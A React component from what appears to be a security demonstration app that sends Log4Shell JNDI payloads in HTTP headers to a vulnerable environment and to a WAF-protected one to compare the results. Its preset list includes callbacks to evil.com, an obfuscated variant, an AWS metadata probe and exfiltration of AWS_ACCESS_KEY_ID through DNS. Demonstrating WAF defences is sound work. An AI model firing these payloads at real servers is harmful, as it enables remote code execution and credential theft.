'use client';

import { useCallback, useRef, useState } from 'react';
import { useArchitectureVisualization } from '@/hooks/useArchitectureVisualization';
import type { AttackEvent, AttackPhase, AttackResult, SessionMetrics, WorkspaceMode } from '@/types';

function computeMetrics(results: AttackResult[]): SessionMetrics {
  const total = results.length;
  const blocked = results.filter((r) => r.blocked).length;
  const avgLatency =
    total > 0 ? Math.round(results.reduce((sum, r) => sum + r.latency, 0) / total) : 0;
  return { blocked, total, avgLatency };
}

const HEADER_OPTIONS = ['User-Agent', 'X-Forwarded-For', 'Referer', 'X-Api-Version'];

const PRESET_PAYLOADS = [
  { label: 'JNDI LDAP', value: '${jndi:ldap://evil.com/a}' },
  { label: 'JNDI RMI', value: '${jndi:rmi://evil.com/payload}' },
  { label: 'JNDI DNS', value: '${jndi:dns://evil.com/x}' },
  { label: '난독화', value: '${${::-j}${::-n}${::-d}${::-i}:rmi://evil.com/a}' },
  { label: 'AWS Meta', value: '${jndi:ldap://169.254.169.254/latest}' },
  { label: 'Env 탈취', value: '${jndi:ldap://${env:AWS_ACCESS_KEY_ID}.evil.com/a}' },
];

interface RceResult {
  status: number;
  latency: number;
  blocked: boolean;
  headerName: string;
  payload: string;
  error?: string;
}

interface RceEvent {
  type: string;
  env?: string;
  status?: number;
  latency?: number;
  blocked?: boolean;
  headerName?: string;
  payload?: string;
  error?: string;
  message?: string;
}

interface Props {
  index: number;
  title: string;
  description: string;
  vulnNote: string;
  awsNote: string;
  mode: WorkspaceMode;
}

export function RceInjectionCard({ index, title, description, vulnNote, awsNote, mode }: Props) {
  const { startScenario, handleAttackEvent, resetScenario } = useArchitectureVisualization();
  const [phase, setPhase] = useState<AttackPhase>('idle');
  const [selectedHeader, setSelectedHeader] = useState(HEADER_OPTIONS[0]);
  const [payload, setPayload] = useState(PRESET_PAYLOADS[0].value);
  const [vulnResult, setVulnResult] = useState<RceResult | null>(null);
  const [awsResult, setAwsResult] = useState<RceResult | null>(null);
  const [savedToast, setSavedToast] = useState(false);
  const esRef = useRef<EventSource | null>(null);
  const localVulnRef = useRef<RceResult | null>(null);
  const localAwsRef = useRef<RceResult | null>(null);

  const startAttack = useCallback(() => {
    if (phase === 'running') return;
    const startTime = new Date().toISOString();
    startScenario('rce-injection');
    setPhase('running');
    setVulnResult(null);
    setAwsResult(null);
    localVulnRef.current = null;
    localAwsRef.current = null;

    const doSave = (localVuln: RceResult | null, localAws: RceResult | null) => {
      void (async () => {
        try {
          const toResult = (r: RceResult | null, attempt: number): AttackResult => ({
            attempt,
            status: r?.status ?? 0,
            latency: r?.latency ?? 0,
            blocked: r?.blocked ?? false,
            label: r
              ? r.blocked
                ? `WAF BLOCKED — ${r.headerName}`
                : `REACHED APP — ${r.headerName}`
              : undefined,
          });
          const vulnResults: AttackResult[] = localVuln ? [toResult(localVuln, 1)] : [];
          const secureResults: AttackResult[] = localAws ? [toResult(localAws, 1)] : [];
          const sessionId =
            typeof crypto !== 'undefined' && crypto.randomUUID
              ? crypto.randomUUID()
              : `${Date.now()}-${Math.random().toString(36).slice(2)}`;
          await fetch('/api/analysis/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId,
              startTime,
              timestamp: new Date().toISOString(),
              mode,
              scenario: 'rce-injection',
              scenarioTitle: title,
              vulnResults,
              secureResults,
              stages: [],
              metrics: {
                vuln: computeMetrics(vulnResults),
                secure: computeMetrics(secureResults),
              },
            }),
          });
          setSavedToast(true);
          setTimeout(() => setSavedToast(false), 3000);
        } catch {}
      })();
    };

    const params = new URLSearchParams({
      mode,
      header: selectedHeader,
      payload,
    });
    const es = new EventSource(`/api/attack/rce-injection?${params.toString()}`);
    esRef.current = es;

    es.onmessage = (msg) => {
      let event: RceEvent;
      try {
        event = JSON.parse(msg.data);
      } catch {
        return;
      }

      handleAttackEvent('rce-injection', event as unknown as AttackEvent);

      if (event.type === 'rce_result') {
        const result: RceResult = {
          status: event.status ?? 0,
          latency: event.latency ?? 0,
          blocked: event.blocked ?? false,
          headerName: event.headerName ?? selectedHeader,
          payload: event.payload ?? payload,
          error: event.error,
        };
        if (event.env === 'vulnerable') {
          setVulnResult(result);
          localVulnRef.current = result;
        } else {
          setAwsResult(result);
          localAwsRef.current = result;
        }
      } else if (event.type === 'complete') {
        setPhase('complete');
        doSave(localVulnRef.current, localAwsRef.current);
        es.close();
      } else if (event.type === 'error') {
        setPhase('error');
        es.close();
      }
    };

    es.onerror = () => {
      setPhase('complete');
      doSave(localVulnRef.current, localAwsRef.current);
      es.close();
    };
  }, [handleAttackEvent, mode, payload, phase, selectedHeader, startScenario, title]);

  const reset = useCallback(() => {
    esRef.current?.close();
    resetScenario();
    setPhase('idle');
    setVulnResult(null);
    setAwsResult(null);
  }, [resetScenario]);

  return (
    <>
      {savedToast && (
        <div className="fixed bottom-6 right-6 z-50 rounded-xl border border-emerald-300 bg-emerald-600 px-4 py-2.5 text-sm font-medium text-white shadow-lg">
          ✓ 세션이 저장되었습니다
        </div>
      )}
      <section className="overflow-hidden rounded-xl border border-slate-200 bg-white shadow-[0_14px_36px_rgba(15,23,42,0.05)]">
        {/* 헤더 */}
        <div className="flex items-start justify-between gap-4 border-b border-slate-200 px-6 py-4">
          <div className="flex items-center gap-3">
            <span className="flex h-7 w-7 flex-shrink-0 items-center justify-center rounded-full border border-slate-200 bg-slate-50 font-mono text-xs text-slate-500">
              {index}
            </span>
            <div>
              <h2 className="font-semibold tracking-wide text-slate-900">{title}</h2>
              <p className="mt-0.5 text-sm text-slate-500">{description}</p>
            </div>
          </div>
          <div className="flex flex-shrink-0 items-center gap-2">
            {phase !== 'idle' && (
              <button
                onClick={reset}
                className="rounded-lg border border-slate-200 px-3 py-1.5 text-xs text-slate-500 transition-colors hover:border-slate-300 hover:text-slate-800"
              >
                초기화
              </button>
            )}
          </div>
        </div>

        {/* 입력 영역 */}
        <div className="border-b border-slate-200 bg-slate-50 px-6 py-4 space-y-3">
          {/* 헤더 선택 */}
          <div className="flex items-center gap-3">
            <label className="w-24 flex-shrink-0 text-xs font-semibold uppercase tracking-wider text-slate-500">
              헤더 선택
            </label>
            <select
              value={selectedHeader}
              onChange={(e) => setSelectedHeader(e.target.value)}
              disabled={phase === 'running'}
              className="rounded-lg border border-slate-200 bg-white px-3 py-1.5 font-mono text-sm text-slate-800 focus:border-slate-400 focus:outline-none disabled:opacity-50"
            >
              {HEADER_OPTIONS.map((h) => (
                <option key={h} value={h}>
                  {h}
                </option>
              ))}
            </select>
          </div>

          {/* 페이로드 입력 */}
          <div className="flex flex-wrap items-center gap-2">
            <label className="w-24 flex-shrink-0 text-xs font-semibold uppercase tracking-wider text-slate-500">
              페이로드
            </label>
            <input
              type="text"
              value={payload}
              onChange={(e) => setPayload(e.target.value)}
              disabled={phase === 'running'}
              placeholder="${jndi:ldap://evil.com/a}"
              className="min-w-0 flex-1 rounded-lg border border-slate-200 bg-white px-3 py-1.5 font-mono text-sm text-slate-800 focus:border-slate-400 focus:outline-none disabled:opacity-50"
            />
            <button
              onClick={startAttack}
              disabled={phase === 'running' || !payload}
              className={`rounded-lg border px-4 py-1.5 text-xs font-semibold transition-colors ${
                phase === 'running'
                  ? 'cursor-not-allowed border-slate-200 bg-slate-100 text-slate-400'
                  : 'border-red-500 bg-red-500 text-white hover:bg-red-600 disabled:opacity-50'
              }`}
            >
              {phase === 'running' ? (
                <span className="flex items-center gap-1.5">
                  <span className="h-1.5 w-1.5 rounded-full bg-yellow-400" />
                  공격 중
                </span>
              ) : phase === 'complete' ? (
                '다시 공격'
              ) : (
                '공격 실행'
              )}
            </button>
          </div>

          {/* 프리셋 버튼 */}
          <div className="flex flex-wrap items-center gap-1.5">
            <span className="text-[10px] font-semibold uppercase tracking-wider text-slate-400">
              프리셋:
            </span>
            {PRESET_PAYLOADS.map((preset) => (
              <button
                key={preset.label}
                onClick={() => setPayload(preset.value)}
                disabled={phase === 'running'}
                className={`rounded-md border px-2.5 py-1 font-mono text-[11px] transition-colors disabled:opacity-40 ${
                  payload === preset.value
                    ? 'border-red-300 bg-red-50 text-red-700'
                    : 'border-slate-200 bg-white text-slate-500 hover:border-slate-300'
                }`}
              >
                {preset.label}
              </button>
            ))}
          </div>

          {/* 전달 정보 */}
          <div className="rounded-lg border border-slate-200 bg-white px-3 py-2 font-mono text-xs text-slate-500">
            <span className="text-slate-400">전달 위치: </span>
            <span className="text-slate-700">{selectedHeader}</span>
            <span className="text-slate-400"> → </span>
            <span className="text-slate-700">GET /api/health</span>
            <span className="ml-4 text-slate-400">실제 전송: </span>
            <span className="text-red-600">{selectedHeader}: {payload}</span>
          </div>
        </div>

        {/* 결과 비교 */}
        <div className="grid grid-cols-1 divide-y divide-slate-200 lg:grid-cols-2 lg:divide-x lg:divide-y-0">
          <RceResultPanel
            label="취약 환경"
            badge="WAF 없음"
            note={vulnNote}
            result={vulnResult}
            phase={phase}
            isVuln={true}
          />
          <RceResultPanel
            label="보안 환경"
            badge="WAF KnownBadInputs"
            note={awsNote}
            result={awsResult}
            phase={phase}
            isVuln={false}
          />
        </div>

        {phase === 'idle' && (
          <div className="border-t border-slate-200 p-4 text-center text-xs text-slate-400">
            헤더와 JNDI 페이로드를 선택하고 공격 실행을 클릭하세요. 취약 환경은 앱 도달, 보안 환경은 WAF 차단됩니다.
          </div>
        )}
      </section>
    </>
  );
}

function RceResultPanel({
  label,
  badge,
  note,
  result,
  phase,
  isVuln,
}: {
  label: string;
  badge: string;
  note: string;
  result: RceResult | null;
  phase: AttackPhase;
  isVuln: boolean;
}) {
  const isDanger = isVuln ? !result?.blocked : false;
  const isSuccess = !isVuln && result?.blocked;

  return (
    <div className="space-y-3 p-5">
      <div className="flex items-center gap-2">
        <span className={`h-2 w-2 rounded-full ${isVuln ? 'bg-red-500' : 'bg-emerald-500'}`} />
        <span
          className={`text-xs font-semibold uppercase tracking-wider ${isVuln ? 'text-red-600' : 'text-emerald-600'}`}
        >
          {label}
        </span>
        <span className="ml-1 rounded-full border border-slate-200 bg-slate-50 px-2 py-0.5 font-mono text-[10px] text-slate-500">
          {badge}
        </span>
      </div>
      <p className="text-xs leading-5 text-slate-500">{note}</p>

      {result ? (
        <div className="space-y-3">
          {result.blocked ? (
            <div className="rounded-xl border border-emerald-200 bg-emerald-50 px-4 py-3">
              <div className="flex items-center gap-2">
                <span className="text-lg">✓</span>
                <span className="text-sm font-bold text-emerald-700">WAF 차단됨</span>
                <span className="ml-auto font-mono text-xs text-emerald-600">
                  HTTP {result.status === -1 ? 'N/A' : result.status} · {result.latency}ms
                </span>
              </div>
              <p className="mt-1 text-xs text-emerald-700">
                WAF KnownBadInputsRuleSet이 JNDI 패턴을 탐지해 애플리케이션 도달 전에 차단했습니다.
              </p>
            </div>
          ) : result.status === 0 ? (
            <div className="rounded-xl border border-slate-200 bg-slate-50 px-4 py-3">
              <div className="flex items-center gap-2">
                <span className="text-sm font-bold text-slate-500">연결 실패</span>
                <span className="ml-auto font-mono text-xs text-slate-400">{result.latency}ms</span>
              </div>
              <p className="mt-1 text-xs text-slate-400">환경 URL이 구성되지 않았거나 연결에 실패했습니다.</p>
            </div>
          ) : result.status === -1 ? (
            <div className="rounded-xl border border-slate-200 bg-slate-50 px-4 py-3">
              <p className="text-xs text-slate-400">AWS URL이 구성되지 않았습니다.</p>
            </div>
          ) : (
            <div className="rounded-xl border border-red-200 bg-red-50 px-4 py-3">
              <div className="flex items-center gap-2">
                <span className="text-lg">⚠</span>
                <span className="text-sm font-bold text-red-700">애플리케이션 도달</span>
                <span className="ml-auto font-mono text-xs text-red-500">
                  HTTP {result.status} · {result.latency}ms
                </span>
              </div>
              <p className="mt-1 text-xs text-red-600">
                JNDI 페이로드가 애플리케이션 로그에 기록되었습니다. Log4j 취약 버전이라면 외부 서버로 콜백이 트리거됩니다.
              </p>
            </div>
          )}

          {/* 페이로드 에코 */}
          <div className="rounded-lg border border-slate-200 bg-slate-50 px-3 py-2 font-mono text-xs">
            <span className="text-slate-400">{result.headerName}: </span>
            <span className={result.blocked ? 'text-emerald-600' : 'text-red-600'}>
              {result.payload}
            </span>
          </div>
        </div>
      ) : (
        <div
          className={`rounded-xl border border-dashed border-slate-200 px-4 py-6 text-center text-xs text-slate-400 ${
            phase === 'running' ? 'animate-pulse' : ''
          }`}
        >
          {phase === 'running' ? '요청 중...' : '공격을 실행하면 결과가 표시됩니다.'}
        </div>
      )}
    </div>
  );
}
